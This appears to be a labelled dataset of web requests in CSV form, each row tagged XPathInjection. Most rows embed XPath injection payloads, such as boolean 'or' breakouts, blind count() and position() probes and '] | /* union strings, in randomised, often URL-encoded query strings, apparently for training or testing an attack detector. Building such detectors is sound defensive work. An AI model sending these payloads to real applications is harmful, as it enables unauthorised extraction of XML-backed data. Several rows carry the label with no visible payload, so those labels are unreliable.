id,class,vector
2333,XPathInjection,cmb6tg=63463&bse=ncr6' or     path/child::node()[position()=N]     or     'Nyer'='
2336,XPathInjection,/euzi2rohntys6Uuk8iw6/z.SSAj/5ahral5VtexhhhsoHql/eecbssNorqtn/QuLlink8ZFNV/oasnttasobaebEs.php?
2343,XPathInjection,/qh/e-_/noellrd22snc/sidnien5aesfLf/itiaetgtjowhe/ps-/pnMJ@yPhQuh6Nc.htm?tc=o%7Eo&YiltDv7h=c4hr5t6+v&swgf=i%40VICmO_0UA&tefnttmhDA=7&tNwid6le1yryt4s=g0RR%40a&futxtTitbaii=71710&ba=66057&Stueoi2C=ireplaceetcc%3BliaznaermY5&sdeetidnges=ofema2y%27++or++++6e%2FOis%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D3%5D+++or++++%27qEq87a%27++++%3D+++%27
2348,XPathInjection,/et86Ldhfuys2WWL_t/vDMdnmArlinkscriptACsSd/na.js?1tetdtgnueAgtd=gpP&ohxiIker=ed5+4ftm
2361,XPathInjection,/qhnc.msf?2nmhms=39093906&Eei=31511&oeudg=y1ooye
2367,XPathInjection,/devZbzr_2ZbSWsn5/eBhUYexec124DFQ/tbWQtIUu1PhHM2J/8wblEqteaaseaLvmeeo/a-s16G2Zli3lmu/n61GY6CQLSftpX/uVaNdudacsmeyei/fNedocument/n.vU/f7qs5-CogFJz/olihg6n.cfm?jik=evlsmnfc&ilnpsnHLtognrr=9&Smne=51617425&GihpgI6U=mTacIuh0&os1udhbnrdtiih=auita%27+++++or++6+++%3C+++++count%28path%2Fchild%3A%3A*%29++or++++%27extlpr%27++++%3D++++%27
2371,XPathInjection,/ham4Sj7/BNUEFOgDDj/nnuh.gif?amnnptrlyied=Ge%3D&knodeKeU541=8269640&hdt6uodx8=0o2oyrHsxsa3srlden&ph9ohe1ao=okmf%27%5D+++%7C+++P++++%7C+++%2F%2Fuser%5B+name%2Ftext%28++%29%3D+++%276iP&mesemysn1ar=ts
2377,XPathInjection,/Vis47mUu/au6b.t5nx/eaho5deofoyjgheos7sh/nz/fmF9t5Y.html?1amE=6&ioautoexec9=atte7vEEst&ulge2suhr=oe%27+++++or++count%28+++path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28+++i++%2B+j%2B++k+%2B+++l%2B+1%29%5D++%7C++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++++or++%270eteaof%27+++%3D+%27++tol9osy%27+++or&uaona5tstl1t=eespnrcteoe&taaeys2ytabe=sneet3l7zdjoeTh&ucabhb=4iframe%5Dnv&4nheeoee=6&.-ZXI=8&osoUlvkysesaodo=eoy&gnhej9toHirelte=dfNw&eAfsqim=8&iCmodtS=21
2378,XPathInjection,/omiolAIfia/Z2uerMuq2g@ELy/0e/6otiaTCep6ke/rfBL00RD.g/Tnev/g9@pA/bFT-T6w3gNik-gA/RF/e5slZyt9bytmtlnyDrp/vd.0P_HY.sh?k0dP_8=oereud5fSltayacs&7yFb=405183715&hz=88&RHiAdJ=et5mcsh%25nnl&s5salbtL9I=a%7CF%2Fmayyinsert+eio&sVwOe4vIx=eyete%27++++or++++1%3C++l%2Fnz%2Fn7r%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D8%5D+++or+++%27amhhde%27++++%3D+%27&7qpsUd7ubFeeeo=ja%242e&Reb=726&@admin5F0aLQKC=ekmk6&rsCnonp=deoeeab1me3tvcb&T5dzrf2p=iJONa&urtbhenmlju=de
2391,XPathInjection,/a.e91tODcGrluShhyeLl/mddssarAtodre/glznmmtnoen/ijFAVE9ygroup
2394,XPathInjection,/aOrXb5Y/stylePjmdWw9oXSwbdK/eoNt/et0M_/dPUgXrC/oh4c/CtHUetctVM0aRv-JX/r5wyb.php?Uafud=s8lfdse6tqyIhu&eQte0dhtne=lirnjR%5Diiio&are6ti5nlzsohLr=595+++++or++++1%3C+te%2F6fruu%2Fea%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D507%5D++or++++24098%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&LwOlxmlMP=otg6YVTclAe&Kx.glibA1binunion=8&wOXrl9=chtaccesc5fsdciinsert&nu8aba1carrnles=eima&BRYk8C2_BjG=iiidsbwmdhoiefn&Rnah4OI=2
2428,XPathInjection,/b7ndd.css?p8yeautrfsnte=0993&htrcfeooqe=46209&9tol6d=hftp%2BnRod%3ET%24o+&rkihrnfSY=0-KwDQTjwMdb&9rnewfidDs=6&wgetgbinP5yU_access_logKbO=9368209&ullcror=lgroup+byANst+%3Dyzd3&lknsSniidrjio=crrhnvwIhmt7ruw&e7eknmAcaB7=cgLuzdJtv&eiseNge=menfc3hv&5ri=itEiuSa%27++or+++++1%3C+++++ce%2Ftni1%2F9rmr%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D976%5D++++or+++%27oe5hJzS%27+++%3D%27&qenmm=oRt1K4SAr8&4oa4o=osBbwpolRe
2431,XPathInjection,/eeasnpir7fF/1e6gj/loodccahtoRvtf.html?pvihsnz=i0OfQOOsb6darcsE&@mZO60e=71409067&3RmesmShro=%28i+++%3C+++count%28o1xtTh%2Fchild%3A%3Atext%28%29%29+++and++j++%3C++++count%28a0o%2Fchild%3A%3Acomment%28%29%29++and+++++k+++++%3C++++count%28tDemh%2Fchild%3A%3A*%29++++%29
2433,XPathInjection,/OSNWXbH0Qyh9r/snyPleesotronea/8onssa6nktwginadIb/niI@Qt7S/meusrofnseeetgDIl/dloetqniaihn/nfsct7eos/mJwKOOE2cR.cw/avMjkbw/ys9fosusef/ss0osearoQslafby5.swf?desy=dLcOH&fGprocessing-instructionc=sl%7E4&httd5ebn0ntbbd=67463++or++++BOElme%2Fbe%2FwiskEd%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D3%5D++or++54%3D
2438,XPathInjection,/t7O1Ut0kxxvRxVts2-/ivZ3/ocPLttogahmLhhEre/3smitd/ybietUBtqeitnqaUo/dtB4sq/PfEL7Z_gmLy/iLW3XM91Vuj6FCcuIPr.css?tse2=mmesape%27++++or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or++%27Dthw%27+%3D+++%27
2447,XPathInjection,/3_dPVi4KTN9i.jpg?U8QU8G=027949968&6lmcoo6=55129+++or++1%3C+++++0eo3tI%2Fcgao%2Fw%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D06%5D+or+++49%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&xee5mforEio4v=lk1lusconnectcUi%3Bhr&grdbranni9=lVYCnUH&onNget=hpdh1roohp6laetoe
2449,XPathInjection,/t5lAa4aKw1K42Xf/oCcS6sz/tRPM/YHCNLOcmd/oQnUuY_selectZselectetc1mBM/ita.nsf?btgau=l.uzpoPP8&im=%28i+++++%3C+++++count%28sCl%2Fchild%3A%3Atext%28%29%29+and+++++j+++++%3C+++++count%28goivji%2Fchild%3A%3Acomment%28%29%29++and++++k++%3C++++count%28diek%2Fchild%3A%3A*%29++%29&enege9boFnmuto=bee&chqb2=0&ihmnheileEswbU=kGNq&oxf5aMirnieOo=%5BRc722em%5Cohostusrhn%29s&tgLt0rZ0m8is=eehat&dsads=n3vQgOLAb%40P9&eT=9677407226&4lesr3giB=o2OFVadbsl
2450,XPathInjection,/SPNatrFBwaencedaom/n2e8FEX4BTX0Lfh49/nU/fjnQAUh_8Ydm/cogunbiqsoeiesw6/ocbbL/g_WhugzQ.shtml?tll6imht3Zhh=474&xt2a=gt%2Feftns%2Fn72eaU%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D1%5D++++or+++%27rbouhemr%27++%3D%27&7H=hee2itbnsSl6lotn&nrisU2saim5en=deY5_u&dddZraiobbtp=az&OntarHla=er4ddrafnzrweThue&1ONV=o1ltm0tpohnbh&XcHW4=i&tsd1rerL0=jg4j_0FnTN&ruslccd=0959680
2466,XPathInjection,oobrbza=qOce&tddblsaiwnssm=2873   or 1<   eueoYn/qinul/I0c3/child::text()[position()=2]  or     1955='] | /* | /foo[bar='&elc=i7r
2470,XPathInjection,/hpaxLlaoolyared/2S/gVL/QngAdabirysns6m/qCnWZSue6/hjWGlinkVhtpass/iDsytmlsihatser29.cgi?o5ent=zN7XZNzHKZ&ideCalenDanhn=2ineuet0%27++or+cAxp%2Ffe%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D8%5D++or+%27Wgpo%27++++%3D+%27&1mlreees7hnnreA=leehlaDqe&btdanbr=2147&i0TurieD=eauasoba
2472,XPathInjection,/el2TGiFuntQEMrF-3/yOZ/afDLv_/a-FsR/eeel7oa/d9F.9s36MNpi/ikqzs_sGlC/eEUgJHeI/tim7ihearcoeujhE/oT-rrRD/fOm5LUdcoeqCS_1h/tQsSNz-.EOrEm.jpg?vokauasvrten=691899&metev=56&spc5aezdtyh8=z4oayLe11hnplaf&fm=8&thhttPtaram=3730787197&tge=w0f%29rsueiui+%27o+na&ldar=fuesuTenibnsIcs&sne=li8rd6lj
2483,XPathInjection,/1twuacee/0hMkt-qXUVRgf/afypnedhno6ahe/3y-connectptFJiE2AC/tdeedn2ner/3vg/sstbfc.swf?.mochah7=3937&tngttuTiccaac6=20++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or+++72947%3D&Useiep=aVc.Vq06BQ&szlzsrbYtttAiNf=ktdali&smtitz=qoSlaaa
2501,XPathInjection,/ou4eic/cqsRmSeofE/lgdeae.jpg?istt9pnsiyad7b=Hd&Rm0iEh=rskec&7@group
2505,XPathInjection,/ls/tcpsezebuuuods3isoo/deletenyOQ0FQ/dj.K5E6N@@TYH./CJCwget6n/Mrhflncs2t4ptmuttjis.exe?zVc7=B%28eRameiat%5B%2Bg%3D&js=iato8xpie6&AdiretdShasa8m=fe6%3C1s&oWBCBloD5r=ltamzha1ea0ie&sxElblh=group+byNf&sadir9eijs=%2Bsystemxml&2namsot=tsHI&etiheii4nobk=40741991&5Rtdpt=46795&lew6Winilndas=4&aosoLdeToOfc=etm0oof%27++or+6+%3C+++++count%28path%2Fchild%3A%3A*%29++or+++++%27xc%27%3D++++%27
2512,XPathInjection,/dLUR0EgRfqdRRLVXq/mcAAO5-UUEeuM6qp.v/sVlocationBd%ufH/d1fA503xmANi/abmhsmisyodno.htm?yUnB=tggdQp&nuebh=Olls
2514,XPathInjection,/X2RFQ2.CMCKGGnull/0-siZy8EMXmail7winntD/jIKXeARrQ7/2G/cPW9@q..nsf?hesAR=%28%3Cc&q8-du.PWg=21+++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or+87990%3D
2531,XPathInjection,1nRt00dpwhnnr=ndn 7ss
2532,XPathInjection,huataiHprl=rAifOU&tsT2en2Hb=eEperlncbgsoundzPrmietegmail%h&leehtknsB=pz9k&Zk31Axrt=dX-RXb0@&nydh=xmoriT&xYtelnetZhavingvKC2=997941&Slsneutra=945&otEoodwues=R
2534,XPathInjection,itiaont3a=s'foeEyIeIq&ouego=<cbdL&entiBh=6890   or     dios0e/T4h/fram/child::node()[position()=91]    or    19=&lsY1kQimhNN=1
2539,XPathInjection,/3sesalqeaAaraaUoeyi/so/aux/nLtzmt/oss7eerp3eeah7/stdin-H4Pdf-BcY9b/01dandA9flMctmpdocument8gN/1It9Hl.DgA@Som.asp?agoc=woinxi%27+++++or+R0tcie%2Foow%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D884%5D+++++or+++%27entso%27++++%3D+++%27&UwW3Rpxwindow.openU=elrttL&IEg7=oTeyoe%25e+7&1tgiipnut=dwiz&zce5Ne=60264&oaaoet6Oj=hiietmajtsrejt5gMh&9CthlVosistrie=s&aluanA7o=8&8HpjMy=p2fmlmtk+%5D%2Bn
2544,XPathInjection,rFasQhel5Lncqm=-qtfys&6ex9otr=99446177&e5Lotu=0743817&Bi@QRweD4=osk el@aN&pbsohrmko0isn=0136&o7div9havingElink4Cq9=096&eI=40004&Eeerbgy=ubam&Bf@TA=71842752
2554,XPathInjection,/i1rirBiqasokzurOnlyb/eeeaodNai8reueitel/u5/fYDZ1bnperlivarpositionhM.asmx?EasnI=0Oo_ARkV0r&ung=aed2edheceoti&4n=%5CDt%5C%27sn&eduIwctpFa=521+or+1%3C+++apbbmt%2Fe%2Fth%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D01%5D+++++or+53223%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&@6GbMHe=Blh&NQre86=2847446&ee4ssd=lr1a2eqReojn3oe&sPoo=c%3Ft+O+h8ahtpass
2555,XPathInjection,IP7s94dJNX=6uOiDHf6NkMo&lndf=Arb+null+eTer7s82xmD0&Qr2aotUUedWtnK=ne0d4emdnaco0p&we5=eens&qoalaef8zn=32269&dyg=aRahnstf&q7u=Si4scriptbho%2Fo+%2B+cn5noac7&q%uwNgNNmetaN=%28i++%3C+++count%28nE%2Fchild%3A%3Atext%28%29%29+and++j+%3C+++count%28rk%2Fchild%3A%3Acomment%28%29%29+++and+k++%3C+++count%28dr3%2Fchild%3A%3A*%29+++%29&lNeaBeirewfceo=ih1t9&mqatEtaitubet=hsBot1xml3n
2559,XPathInjection,/snishdfsD8oheeghs7.mspx?eeeaeoesblsfty=3yRUo2JtNM&rm=ernE%27+++++or+6++++%3C+++++count%28path%2Fchild%3A%3A*%29++or+++%27sorS6%27+%3D+%27&nenaEe4e=nJirq8m&yoptselectVUwGopt_O=fGBmN
2563,XPathInjection,easq=35156668&achqikhf=nts/svpt/I/child::node()[position()=5]    or  '0lyt'=  '&buoah=7&2IECtmp8=himkn2vts7trmehi&autoexecrLb5=eApa6Moz8&tTl8ua=uK5RtgwyreeeH&3TuzNA=148&jkehmdeecnnh=pYX4x&aa5ohlfnuiznpo= eodocumentatmochae2N&nDwRwKb-Xv=rspstiha&vurneeQzyPnas=sFKl&Up2dKlwinntprocessing-instruction_2=yeF)5foyejd
2564,XPathInjection,/h2w_qnetcatiK/l9TwLTexecgValllibIApositionV/rmFIrVycEgDzP.shtml?mde1srsEcoee=57124&eicbeaUgoti=s89&ie=6102307304&oarbmanst=33575635&TDoVRM=4l+esytea&SItsedhbEmr11u=%28i+++%3C++count%28Dusko%2Fchild%3A%3Atext%28%29%29++and++++j+%3C++++count%28i3pe%2Fchild%3A%3Acomment%28%29%29+++and+k++%3C++count%28nloei%2Fchild%3A%3A*%29++++%29&EcZcJYlibhXINu=xp_&8S=6&sRU47esststaefl=gjO%40&pRh=e
2569,XPathInjection,/tEfNTVn/lGns-NbVLRDn/eQ/njnemnfveye/u_QTY.zXtJLQdu/eHKX_Tl@t_sQxUwC@iI/us6wadrmthi8A1p/uooG__k7SfeLhhk2v1R/eepOm/aHyfmesceTsir8I0i/iteOgBgiE/aZeIoBMa5u0t.asmx?ehftui4rAne=sgnvSjxBi&un7oosrsae2o5te=9L&S5reki=14383219&ErpsA1-=92++++or+++u%2Flsh%2Fnutj%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D226%5D++or+++143%3D&Umedeokthro=r6&noDt=sAxb4-Zi&tl=unionn4rd&c7=m&5mcol3=piBchneo&tyzsshnr2A=wH-gkl1LBSwa&sOl8r=0&ti1sdhdbzrwh=ofd&Annrignlct=67
2571,XPathInjection,/xH4eEwTtsEmlciyoT1in/stdin6V2var_A2L.xI_W/hkwetHsdhb2taktsei/ieay/ujeiirabtL/ot1oFC/sm/oLUjD/lnw1rqoHOOgit3no.gif?fn6eZaetadid=3&iOnisriPti=pBwa&XNdr3oDet=rhtaes6da&Mheemiitjtepita=gFpixoH0&nafhw8uaJwaex=uie&Kk1hand17M_K=9945+or+ofbs%2Fw0n%2Fs%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D105%5D++++or++8118%3D&adEjys8ml=oNoY8kY&inrraLitslhtesr=oo0s5swhhnhtja
2572,XPathInjection,/f3qf6T7Xgux/aKIc4Fwbptg/rrnonl8e/eLxguee2nvRwE0/1oteNarAwoottnt6peh/eesjrskBFosn/tUrhkCFMadR3QN85eaXQ.exe?Rc@OXt2ZQ=owha3osu%27+++++or++%28i++++%3C+++count%28srt%2Fchild%3A%3Atext%28%29%29++++and++++j+++%3C+++count%28hhemo%2Fchild%3A%3Acomment%28%29%29+and+k++%3C+++++count%28eo%2Fchild%3A%3A*%29++++%29+or+%27aL%27++%3D+%27++ge%27+++or&Go81wtTet=1&LIag.Ymuxtermj=t%3Fan5&tatnoiihlbua=n&sjquombOctKI=ib6S6%40Wh-&soM8sReo=%7CnsxnetiNd%3Fhaccess_log-O&wenp6r9jsmfhae=iianlh2cda&oOOhM=mstdinhome&rtsec=u+au&zupdate8-b=ah&fz1leoNnrtl=8957798&5vsp7vrgnwgJci=e
2590,XPathInjection,/lDdfTj/riofGsshanshpn/tboI1hR@bNlCpWF/ovqYPZ/yhr/rboot.ini/Wsno/ttUMSL7UWK48ByTSUh/nra8velin/r4bLh@BNnmrS2kL8V/ndatnumeS2tqERrqee.css?4Errhicaae9aoer=ataAot8%27++++or+++++1%3C+++htn%2Fnc%2FAlhcss%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D5%5D+or+%27ak%27+%3D%27
2594,XPathInjection,bies=eu?&htniy=ysei&etaeewsni5iu=et'e0bgsoundi\2eii>eoSeaaor&oa=1sRevalk&aave2aa=235    or    count(path/child::node()[position()=((i+j+k+l+1)] |  path/child::*()[position()=(k+1)])=1     or  0559=&2aRRlnL8l8=oselecte)i&GAQyY=cPY3
2604,XPathInjection,/rr3CGt_Sdwk2zv/aH3u8a/loLx8lZjq/2G0rf96BgewyBZ@S/mElY9/rltmuxnEeuv/n6/epdniwrapet8/Tee9eb0bg9.cfm?formPJ6ex.-Y3-P=4295&b7DfTS=rBesxwems&ReALewinntjOnph-=Asnteyv8autoexecbe%3B&j-KVkf0=ngoyl6aE%27++or+6++%3C++count%28path%2Fchild%3A%3A*%29+++++or+++%27Jre%27+%3D%27&tim1tohiE4=pieSd&proed9c0=t%3CnOft%3Anmstdin%2F
2611,XPathInjection,/b6grf/pdSUwvvzR/seyiaoiEn/ZTP/hObkkTJ8xzrWj@HngC.png?nxKJUwMJ=r%7Cautoexeci3+e%29c%28&ej=uof%2Fone2t%2F2er3s%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D7%5D+++++or+++%27eo5mnuwu%27++%3D++%27
2616,XPathInjection,/fucGPoZLPmLzFHf/tP1dVzCSG/s6vNKwe6V/7deldcz3da36gT/6tkrdee.nsf?7IqAnadop=dinncqhaela+Yp&aeuAwkomrteqea=tselectvbscriptNrc%5DursitGev
2619,XPathInjection,/hcatsiefo2wi/1q/eT5jzo3QfxKB47@z44Kb/e2/ieyK@Opn7n17nNa9J/bOFi9T-g/qt0EX-25pnI/vxjKc/ulikeaezVLxp_3/nngm.js?muteceeqeAc=eI%3Eos&mlsY=%5CSre&tee5lrid1=1461009&h6rqssazac=oecoyhlOopEf&o4drt9laawmWH=tQD&exlhhCr6lsny=8566301&Wpassthrus0Ctk@iUF=rmoySso2ttienht48n&tsoah=6206223&wlon5jsgnrnSiA=iae%2Fy4%2FalJ3%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D787%5D+or++++%271wdh%27++%3D+++%27
2622,XPathInjection,M4kBadmine=39  or     1< riy/Lsti/T/child::text()[position()=1] or     1965='] | /* | /foo[bar='&kewo6o=45206660&en=sl-r>&n1yIVn4=aletlibrt&TdocumentqNynrwn_F=02&Tc=exN3aS&WaU8jlQCILX=4 E\\Ezdei8s1d&nIaeth=Eonaiho thn0 t&3.kGX7S.rWz=j/&7etr5srz2eeyk=dj9uascR&oXTK-Dmailh3=eRunaey iATd&7Ssnse=rztIteao1himc&0acoi50edalsm=ecyperla
2623,XPathInjection,/mites4Neet/rt/tC/eocp/p1/IApositionYlikeC/ahragajnDrI7dieeun/rOq/stxiOlCalhumezhn5isi/tnY3SBT/etse2lCpaeeERpl/l-_.sOGZ.png?Eboot.ini0z6=911&welt2=slandrimgleonl&ercetTsytrvt=303+++or++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C+++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or+++++76337%3D&I7ydeutiezJa=e8tN
2624,XPathInjection,/iP/1-/ay4f6Oih/nGaUH/i5r335WZA-QpZR/d-_0j/t0a2DlHmslc6JdzCtPdE/phi6oqoewiirrt.pl?AneTLa=insert+r4&or1ieHsSemtr=92702449&location639sT=lclcop&anmriaHTrtlt=slO9oh&txszstgikimlrti=%28i+%3C+count%28dngy%2Fchild%3A%3Atext%28%29%29+and+j+++%3C+++++count%28rPrnna%2Fchild%3A%3Acomment%28%29%29+++and++++k+++%3C+++++count%284e%2Fchild%3A%3A*%29+%29&4oFec2ztA=wx1d%40RzlQaO&M-MTnetcat=0716&ualCntiltitj=sct&atra9soe=29896&rohiiadHiyi=gLn&tapo7gt8ocre=85598372
2628,XPathInjection,/no7PadUectnx.L-83xHD/zigidb/icNiaaatwiipsoest/nmHvI/4@SC@f_R/EkmreFbeo/adG.tiff?br=Efe%27+++++or++%28i++++%3C+++++count%28uabeEr%2Fchild%3A%3Atext%28%29%29+++and+j++++%3C+count%28mlfeb%2Fchild%3A%3Acomment%28%29%29++and+++k+++%3C++++count%28dtlrf%2Fchild%3A%3A*%29+++%29+or+%27ee%27++%3D+++%27++sRmt%27+or&taGox7WOC=011533475&nfltaoetl=09&Gtenit=sBrfYYC&ah=ytiuxabbbB2pan&onhaxsnhhysagb=j%3Eet%24c%7Enetcatigroup+by%5Cvhtacces%3D9ht3&l4pst=%3FiEbz&am8=95607
2632,XPathInjection,/w76mh/mGzutXG94n/htuCTh2osf2eckt4G1hk/i14hRIY/h9ioep3st6hs.swf?hoAhRt=ed+samaa&fyd4ewit=lueoxhLx%5Dh%3An+tinterh&AwYb=hhobehpacs&9fr7eoeneraygog=%5Cty&@-3e2H5urNB=P8%3Aa%3CAnyvl%3Btn&bombnetieral7oz=55&tan=eeedrn3A4n&u@eq=c6hntokeNk&pofe=twp&iswteg45=ml%27++++or+++5mo%2Fgt%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D29%5D++++or+++%27mxz%27%3D++%27&en1hyEandhojo5=Raisa&0rremeSH5Nd=e3sjteaehs3s&eP1dna8cw=seeeotzoebt8sdeue&a6o1Sph=soh&weurhtioe=EMzhLirus%3Bh%28
2633,XPathInjection,taaeIlTnse=yautoexecv>rmvaroacceptaW&mwS-RY6J6XvV=5427390031&elXgdePerst=otobef&bsaHmeosnne=eu7V8GKia&u7aonrehSa=o&onFn=vyEtelnet?r srypso&olaademthbu=63504&ote2ises=ncs73Tot>feideo&ImbagqeanO4=> i0s1a&pten9=05
2640,XPathInjection,/Zuz-eqdocumentL7E5MgK/feTKRupdate17UXNgwc./j8@x/nnByVcOXDQqp7Z3JWhm/reoGl7ewgxnUcwaayrt/dW3-iyEIVLy0O/sDacqy3iA.IdGH.cgi?oe=n%7El&ons4hild=0+++or+++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or++14007%3D&hw8a=fdnwget%7Cpj%3Aoh6l8e&boeitjsdddec=mhNQnwZr7&arWdott=ceg%7Emdiveycetg1Tvbscripti%7E&gn2r=+2Ienwoeor&A4eit=adsoPuno
2642,XPathInjection,/0emz9en1rw/x6HZG/luN1a5shlnitnnRrElw/c6YjoBqvMb-P/th8lrWqxGHW6qmnptWeH/dUfzLWqB@a5copyMWa/mYgNZQnHWjdLYLJwegWH/onhlnRoI.gif?neeqamzh=nIo%26&ArPeh=u7k&mnp=3510094722&Oigichrsahdn=+no+hetw4&senAeraevfhheh=a1gcdVSoZ5&ewIrdiponi=ie4iaeeez&Wtnoi=%26+&teast9nzs6=ppoiaeecnhlndce&nonDmw=tzsnl%2Fni%2Fsi%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D8%5D+++++or++%27al%27++%3D++++%27&2bu3tese5eog=88930267
2649,XPathInjection,/daApel/heidyamp/esh_Pl/l.WFgSag0/mageoPie/bR33GokQgy-meC/enh/2Xt8DHM/sifemnnptdD2lisdpcte/0GC.exe?hettHci8Hn=cerxhn&oedemtel=aa-te%40remeO%3Adal&2sm1e6rs=esn%3Cinput0dfn%7Eftpmochay0&lEwoIewbsnimi6l=nb&N1msE=4xeeerhalc8&aHv1jx=wtn&enstlh=%24+nhoedjn&sdf1a9tesxilg=0091328201&Ae0r4ua=ruslibma+hhEEQm&otgdsoNtspyse=57705322&ihld=hse8&rehQ9oleyp=nd+n&ebit=35600&h3n=l3&arhiQwzoh2bzgtr=eadi%2Fetc%2Fisda1%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D9%5D+++or++++%27gmU%27++++%3D%27
2650,XPathInjection,/ePBPSwbfavu/nv@@4t3UZpru3Q/ty6Neehrhajt/-uTCUyD/vtcpc/r1IL/oBXv8szOKww5orM/iz99jCS_jjiGxZdwPt.swf?e3cR=ie8aXpBD&epntsrhvguNmjo=550877002&ai=61432&os8itpalI=m%3D&waoli=8819171&mhjysed3e=ciaflut&2rnyoumxe=nrr%2FAroaii%2Fee%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D2%5D++or++++%27dh%27%3D%27&ae=sXdsp&O3thesaeslt=oo&Taefswbttle=86813063&h9=sl-1f%2Fktiel%25+l+Es&fxDhawo3l4tanml=6&OqUk=gee&5tuaEtyikqLoCe=832&auect=y9cIrttcxuas
2679,XPathInjection,/olglayDxiLEs/LtriikmVbgsoundM/tB-Uo3XqWHUm.exe?oeanyC=n%40e+Oz%7CT&itht8nrt=6616+++or+l%2F5ati%2Fxbudt%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D8%5D+++or+71%3D&jaeeias=ESezCdropselectnd9b+rbnsam4&yvFcaFG5=eLYEMAv&L839xOhttpsOwp-vj=rma&ost7feetoynre=esgwtpsI&yfnra=ini0&3tar=m1tOmav&PZvHsz8tZRrA=dr2nhn&jpdhie7e5erU=iD07&G_wZ_=ee9tiOli5d&v1h-CD0=91&JperlLknaP-zrmaz=kj0le48sssaq&llayu9rnrvls=33
2686,XPathInjection,/3_Py8p2VDRQYWFHjxd.html?8G2ol6viu=kged1tunionlne%5Dtmpht&eczoalhe=Fng%27%5D+%7C++++P++%7C+++++%2F%2Fuser%5B++++name%2Ftext%28++%29%3D++++%27dmu&naws1iseam1h=lm4++mochaesde&3alewkn6pi=l%3Fwudh%7E+ilo%7C+where
2687,XPathInjection,/o@lCerYWnjOX75Un0Y/toc4fswgrehagrmdrlh/TrsqlntInar/3xqPJV9OnaJ.swf?si2lh9sEsashv=99&acdnaor=18089&edjene7nNL=oAh&c4con=tv8rpav&hI=jloqaee%27++++or+++++%28i+%3C++++count%282g5h%2Fchild%3A%3Atext%28%29%29++and++j+++%3C++count%28eaZ%2Fchild%3A%3Acomment%28%29%29++and+++k++++%3C+++++count%28teqt%2Fchild%3A%3A*%29++%29++or+++%27rasedwlt%27+++%3D++%27++L464%27++++or&Dps=Inco+C&afoH8hsn=e%3Bo4saO%3Butetir
